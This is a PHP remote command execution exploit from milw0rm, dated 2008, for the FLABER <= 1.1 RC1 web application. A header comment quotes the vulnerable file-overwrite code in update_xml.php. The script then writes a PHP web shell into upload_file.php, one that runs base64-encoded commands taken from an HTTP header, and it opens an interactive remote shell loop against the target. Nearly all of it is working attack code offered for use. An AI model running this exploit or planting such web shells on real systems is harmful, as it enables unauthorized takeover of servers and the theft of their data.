<?php

/*
	--------------------------------------------------
	FLABER <= 1.1 RC1 Remote Command Execution Exploit
	--------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://sourceforge.net/projects/flaber

	[-] vulnerable code in /function/update_xml.php
	
	12.		$target_file = $_GET ["target_file"];
	13.		
	14.		// if the target is well defined, update now...
	15.		if ($target_file == "")
	16.		{
	17.			echo ("<critical>" . $FILE_NAME . " Incorrect parameter target_file.</critical>");
	18.			exit;
	19.		}
	20.		
	21.		
	22.		$target_file = "../" . $target_file;
	23.		
	24.		// if it is a file
	25.		if (is_file ($target_file))
	26.		{
	27.			if (!is_writable ($target_file))
	28.			{
	29.				echo ("<critical>" . $FILE_NAME . " " . $target_file . " is not writable.</critical>");
	30.				exit;
	31.			}		
	32.	
	33.			$fp = fopen($target_file, "w");
	34.			
	35.			$raw_xml = file_get_contents("php://input");
	36.			fwrite($fp, $raw_xml);
	37.			
	38.			fclose ($fp);
	39.			echo ("<normal>" . $FILE_NAME . " " . $target_file . " updated successfully.</normal>");
	40.			exit;
	41.		}
	
	an attacker could be overwrite an existing file with arbitrary data by $_POST array (lines 33-36)

*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from ".$host.":80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

print "\n+------------------------------------------------------------+";
print "\n| FLABER <= 1.1 RC1 Remote Command Execution Exploit by EgiX |";
print "\n+------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage:		php $argv[0] host path\n";
	print "\nhost:		target server (ip/hostname)";
	print "\npath:		path to FLABER directory (example: / or /flaber/\n";
	die();
}

$host	= $argv[1];
$path	= $argv[2];

$payload = "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>";
$packet  = "POST {$path}function/update_xml.php?target_file=function/upload_file.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;

if (!preg_match("/updated successfully/", http_send($host, $packet))) die("\n\n[-] Exploit failed...\n");

define(STDIN, fopen("php://stdin", "r"));

while(1)
{
	print "\nxpl0it-sh3ll > ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet  = "GET {$path}function/upload_file.php HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$html = http_send($host, $packet);
		if (!ereg("_code_", $html)) die("\n[-] Exploit failed...\n");
		$shell = explode("_code_", $html);
		print "\n".$shell[1];
	}
	else break;
}

?>

# milw0rm.com [2008-04-08]